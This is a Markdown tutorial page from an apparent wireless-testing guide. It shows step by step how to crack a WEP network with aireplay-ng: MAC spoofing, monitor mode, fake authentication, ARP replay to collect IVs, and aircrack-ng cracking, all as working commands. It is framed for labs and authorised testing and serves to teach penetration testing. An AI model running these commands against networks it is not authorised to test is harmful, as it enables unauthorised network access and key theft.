# Fake authentication and ARP replay (aireplay-ng)

> **Lab and authorised testing only.** For a network you own or have written permission to test. See the [legal section](../README.md#legal-and-ethics) in the main guide. Official reference: [aireplay-ng documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng).

Fake authentication and ARP replay are classic **WEP** attack steps. WEP is obsolete and you will rarely meet it outside a lab or old hardware, but it is the cleanest way to understand injection, and `--fakeauth` is also how you associate with an AP that has no clients so you can inject.

## 1. Change your MAC first (optional but tidy)

```bash
macchanger -s wlan0                 # show current MAC
sudo ifconfig wlan0 down
sudo macchanger -r wlan0            # random MAC (or -m AA:BB:CC:DD:EE:FF for a set one)
sudo ifconfig wlan0 up
```

## 2. Monitor mode and lock onto the target

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                               # find the target, note BSSID + channel
sudo airodump-ng wlan0mon --bssid <router-mac> -c <channel> --write capture
```

## 3. Fake-authenticate with the AP

This associates your card with the AP without a real client login, so the AP will accept your injected frames.

```bash
sudo aireplay-ng --fakeauth 0 -a <router-mac> -h <your-mac> wlan0mon
```

- `--fakeauth 0` single association attempt (use a number like `30` to re-associate every 30s if the AP drops you)
- `-a` the AP BSSID
- `-h` your card's MAC (confirm it with `macchanger -s wlan0mon` or `ip addr`)

A success looks like `Association successful :-)`.

## 4. ARP replay (generate traffic to speed a WEP crack)

```bash
sudo aireplay-ng --arpreplay -b <router-mac> -h <your-mac> wlan0mon
```

This captures an ARP packet and replays it, making the AP generate lots of IVs fast. airodump keeps writing them to `capture-01.cap`.

## 5. Crack

```bash
aircrack-ng capture-01.cap
```

With enough IVs, WEP falls in minutes. That speed is exactly why WEP is dead: the lesson for any report is "if you still run WEP anywhere, replace it now."

---

For WPA/WPA2 (what you will actually meet), do not use fake-auth or ARP replay. Capture the four-way handshake or the PMKID and crack offline. That full workflow is in the [main guide](../README.md#capture-the-handshake).
